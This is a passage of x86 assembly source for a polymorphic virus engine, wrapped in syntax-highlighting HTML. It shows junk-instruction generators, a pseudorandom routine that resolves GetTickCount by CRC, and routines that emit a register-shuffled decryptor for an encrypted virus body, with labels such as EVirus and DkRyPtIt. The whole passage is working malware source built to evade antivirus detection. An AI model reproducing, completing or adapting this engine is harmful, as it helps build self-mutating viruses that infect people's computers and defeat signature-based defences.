</span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">ok6</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ok6</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">esireg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">esireg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">Trash7</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Trash8</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc1">;0FAh;cli ;damn damn damn in NT cli is privileged :'(</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">Trash8</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Trash9</span><span class="sc0">


</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">ok8</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ok8</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ecxreg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">random2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ecxreg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">Trash9</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">TrashA</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">esireg</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nook9</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ecxreg</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nook9</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0d6h</span><span class="sc1">; SALC</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">nook9</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">TrashA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">TrashB</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">okA</span><span class="sc0"> 
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">okA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">random3</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">esireg</span><span class="sc4">]</span><span class="sc1">;no ecxreg</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nookA</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ecxreg</span><span class="sc4">]</span><span class="sc1">;no esireg</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nookA</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc1">;no esp</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nookA</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc1">;no eax becoz opcode is different becoz some instruct. are optimizated for eax.</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">nookA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">random2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">opcodesA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">random1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">nookA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">opcodesA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2bh</span><span class="sc1">;sub</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1bh</span><span class="sc1">;sbb</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc1">;adc</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc1">;add</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">23h</span><span class="sc1">;and</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3bh</span><span class="sc1">;cmp</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8bh</span><span class="sc1">;mov</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bh</span><span class="sc1">;or</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">85h</span><span class="sc1">;test</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">TrashB</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;nothing,only call trash again</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">

</span><span class="sc5">NoTrash</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">randomize</span><span class="sc4">:</span><span class="sc1">;a pseudorandom number generator...its a few bad :P i could have searched something</span><span class="sc0">
        </span><span class="sc1">;about random generators but i was tired in that moment ;P so i coded this short</span><span class="sc0">
        </span><span class="sc1">;and not very efficient function...however i like it :-m</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0001FFFFh</span><span class="sc0">
</span><span class="sc5">WaitAFew</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">WaitAFew</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">GetTickCountCRC</span><span class="sc4">,</span><span class="sc5">GTCNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">random1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CryptKey</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">random2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CryptKey</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">random3</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">random1</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">random2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">random3</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;all this functions receive as parameter edi pointing to code where we must write polimorphed</span><span class="sc0">
</span><span class="sc1">;code and return edi pointing to next byte where we have writed</span><span class="sc0">
</span><span class="sc1">;for now,for useful instructions of decryptor,only is changed the used registers,intruction</span><span class="sc0">
</span><span class="sc1">;is not changed by other.</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;zpop poly</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">zpop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">esireg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">A1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">A2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;zadd poly</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">zadd</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">esireg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">noeaxreg</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">B2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">B3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">B2</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">noeaxreg</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">B1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">B1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">B1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">B2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">B1</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">B1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">Encrypted</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">DkRyPtIt</span><span class="sc0">
</span><span class="sc5">B2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Encrypted</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">DkRyPtIt</span><span class="sc0">
</span><span class="sc5">B3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;zmov poly</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">zmov</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ecxreg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">C1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">C2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">C1</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">C1</span><span class="sc4">],</span><span class="sc2">0B8h</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">C1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,((</span><span class="sc5">EVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Encrypted</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">C2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;zxor poly</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">zxor</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">D2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CryptKey</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ecxreg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">esireg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
